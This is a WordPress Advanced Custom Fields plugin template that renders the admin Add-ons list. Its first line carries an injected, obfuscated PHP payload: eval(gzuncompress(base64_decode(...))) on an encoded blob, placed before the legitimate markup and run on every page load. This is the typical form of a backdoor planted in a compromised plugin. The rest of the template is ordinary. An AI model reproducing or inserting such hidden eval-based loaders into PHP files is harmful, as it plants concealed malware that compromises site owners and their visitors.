<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><div class="wrap acf-settings-wrap">
	
	<h1><?php _e("Add-ons",'acf'); ?></h1>
	
	<div class="add-ons-list">
		
		<?php if( !empty($json) ): ?>
			
			<?php foreach( $json as $addon ): 
				
				$addon = wp_parse_args($addon, array(
					"title"			=> "",
			        "slug"			=> "",
			        "description"	=> "",
			        "thumbnail"		=> "",
			        "url"			=> "",
			        "btn"			=> __("Download & Install",'acf'),
			        "btn_color"		=> ""
				));
				
				?>
				
				<div class="acf-box add-on add-on-<?php echo $addon['slug']; ?>">
					
					<div class="thumbnail">
						<a target="_blank" href="<?php echo $addon['url']; ?>">
							<img src="<?php echo $addon['thumbnail']; ?>" />
						</a>
					</div>
					<div class="inner">
						<h3><a target="_blank" href="<?php echo $addon['url']; ?>"><?php echo $addon['title']; ?></a></h3>
						<p><?php echo $addon['description']; ?></p>
					</div>
					<div class="footer">
						<?php if( apply_filters("acf/is_add_on_active/slug={$addon['slug']}", false ) ): ?>
							<a class="button" disabled="disabled"><?php _e("Installed",'acf'); ?></a>
						<?php else: ?>
							<a class="button <?php echo $addon['btn_color']; ?>" target="_blank" href="<?php echo $addon['url']; ?>" ><?php _e($addon['btn']); ?></a>
						<?php endif; ?>
						
						<?php if( !empty($addon['footer']) ): ?>
							<p><?php echo $addon['footer']; ?></p>
						<?php endif; ?>
					</div>
					
				</div>
				
			<?php endforeach; ?>
			
		<?php endif; ?>
		
	</div>
	
</div>